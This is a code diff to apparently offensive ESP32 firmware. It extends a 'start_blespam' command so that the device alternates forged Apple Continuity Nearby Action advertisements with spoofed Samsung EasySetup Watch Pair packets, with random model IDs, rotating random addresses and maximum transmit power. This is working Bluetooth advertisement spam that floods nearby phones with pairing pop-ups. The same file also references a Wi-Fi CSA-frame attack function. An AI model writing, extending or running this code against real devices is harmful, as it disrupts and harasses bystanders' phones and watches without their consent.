@@ -26311,6 +26311,13 @@ static const uint8_t blespam_na_actions[] = {
     0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B
 };
 
+/* Samsung EasySetup Watch models used by Momentum BLE Spam "Samsung Watch Pair". */
+static const uint8_t blespam_watch_models[] = {
+    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C,
+    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0xE4, 0xE5,
+    0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF
+};
+
 static uint16_t blespam_ms_to_itvl(uint16_t ms)
 {
     uint32_t itvl = ((uint32_t)ms * 8u) / 5u; /* 0.625 ms units */
@@ -26348,6 +26355,26 @@ static void blespam_make_nearby_action(uint8_t packet[11])
     packet[10] = (uint8_t)(auth >> 16);
 }
 
+static void blespam_make_watch_pair(uint8_t packet[15])
+{
+    uint8_t model = blespam_watch_models[esp_random() % sizeof(blespam_watch_models)];
+    packet[0] = 14; /* AD length */
+    packet[1] = 0xFF; /* Manufacturer Specific */
+    packet[2] = 0x75; /* Samsung company ID */
+    packet[3] = 0x00;
+    packet[4] = 0x01;
+    packet[5] = 0x00;
+    packet[6] = 0x02;
+    packet[7] = 0x00;
+    packet[8] = 0x01;
+    packet[9] = 0x01;
+    packet[10] = 0xFF;
+    packet[11] = 0x00;
+    packet[12] = 0x00;
+    packet[13] = 0x43;
+    packet[14] = model;
+}
+
 static int blespam_start_adv(const uint8_t *packet, uint8_t packet_len, uint16_t delay_ms)
 {
     if (ble_gap_adv_active()) {
@@ -26376,13 +26403,16 @@ static void bt_blespam_task(void *pvParameters)
     (void)pvParameters;
     uint16_t delay_ms = bt_blespam_delay_ms;
     uint32_t packets = 0;
+    uint32_t apple_packets = 0;
+    uint32_t samsung_packets = 0;
+    bool use_samsung = false;
     int64_t last_status_us = esp_timer_get_time();
     int64_t last_fail_us = 0;
 
-    ble_addr_t rnd;
-    int rc = ble_hs_id_gen_rnd(0, &rnd);
+    ble_addr_t session_addr;
+    int rc = ble_hs_id_gen_rnd(0, &session_addr);
     if (rc == 0) {
-        rc = ble_hs_id_set_rnd(rnd.val);
+        rc = ble_hs_id_set_rnd(session_addr.val);
     }
     if (rc != 0) {
         MY_LOG_INFO(TAG, "BLE spam: failed to set random address (%d)", rc);
@@ -26396,12 +26426,30 @@ static void bt_blespam_task(void *pvParameters)
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P20);
 
     while (bt_blespam_active && !operation_stop_requested) {
-        uint8_t packet[11];
-        blespam_make_nearby_action(packet);
+        uint8_t packet[15];
+        uint8_t packet_len;
 
-        rc = blespam_start_adv(packet, sizeof(packet), delay_ms);
+        if (use_samsung) {
+            ble_addr_t watch_addr;
+            if (ble_hs_id_gen_rnd(0, &watch_addr) == 0) {
+                ble_hs_id_set_rnd(watch_addr.val);
+            }
+            blespam_make_watch_pair(packet);
+            packet_len = 15;
+        } else {
+            ble_hs_id_set_rnd(session_addr.val);
+            blespam_make_nearby_action(packet);
+            packet_len = 11;
+        }
+
+        rc = blespam_start_adv(packet, packet_len, delay_ms);
         if (rc == 0) {
             packets++;
+            if (use_samsung) {
+                samsung_packets++;
+            } else {
+                apple_packets++;
+            }
         } else {
             int64_t fail_now = esp_timer_get_time();
             if (last_fail_us == 0 || fail_now - last_fail_us >= 1000000) {
@@ -26412,8 +26460,9 @@ static void bt_blespam_task(void *pvParameters)
 
         int64_t now = esp_timer_get_time();
         if (now - last_status_us >= 1000000) {
-            MY_LOG_INFO(TAG, "[BLESPAM] packets=%u delay=%u",
-                        (unsigned)packets, (unsigned)delay_ms);
+            MY_LOG_INFO(TAG, "[BLESPAM] packets=%u apple=%u samsung=%u delay=%u",
+                        (unsigned)packets, (unsigned)apple_packets,
+                        (unsigned)samsung_packets, (unsigned)delay_ms);
             last_status_us = now;
         }
 
@@ -26421,6 +26470,7 @@ static void bt_blespam_task(void *pvParameters)
         if (ble_gap_adv_active()) {
             ble_gap_adv_stop();
         }
+        use_samsung = !use_samsung;
     }
 
     if (ble_gap_adv_active()) {
@@ -26458,7 +26508,7 @@ static void bt_blespam_stop(void)
 }
 
 /**
- * Command: start_blespam - Apple Continuity Nearby Action (Momentum Action Modal)
+ * Command: start_blespam - Apple Action Modal + Samsung Watch Pair
  *   start_blespam
  *   start_blespam [20|50|100|200|500]
  */
@@ -26483,7 +26533,7 @@ static int cmd_start_blespam(int argc, char **argv)
     {
         char oled_l3[24];
         snprintf(oled_l3, sizeof(oled_l3), "  delay %ums", delay_ms);
-        oled_display_update_full("> BLE Spam", "  Action Modal", oled_l3, "  Advertising...");
+        oled_display_update_full("> BLE Spam", "  Apple+Samsung", oled_l3, "  Advertising...");
     }
     log_memory_info("start_blespam");
 
@@ -26529,7 +26579,7 @@ static int cmd_start_blespam(int argc, char **argv)
         return 1;
     }
 
-    MY_LOG_INFO(TAG, "BLE spam started (Apple Action Modal). Use 'stop' to end.");
+    MY_LOG_INFO(TAG, "BLE spam started (Apple Action Modal + Samsung Watch Pair). Use 'stop' to end.");
     return 0;
 }
 
@@ -28097,7 +28147,7 @@ static void register_commands(void)
 
     const esp_console_cmd_t start_blespam_cmd = {
         .command = "start_blespam",
-        .help = "Apple Action Modal BLE spam: start_blespam [20|50|100|200|500]",
+        .help = "Apple Action Modal + Samsung Watch Pair BLE spam: start_blespam [20|50|100|200|500]",
         .hint = "[20|50|100|200|500]",
         .func = &cmd_start_blespam,
         .argtable = NULL
@@ -28429,7 +28479,7 @@ void app_main(void) {
                             "",
                             "  > Ready _");
     vTaskDelay(pdMS_TO_TICKS(100));
-    
+
 }
 
 static void wsl_bypasser_send_csa_frames(const target_bssid_t *target)
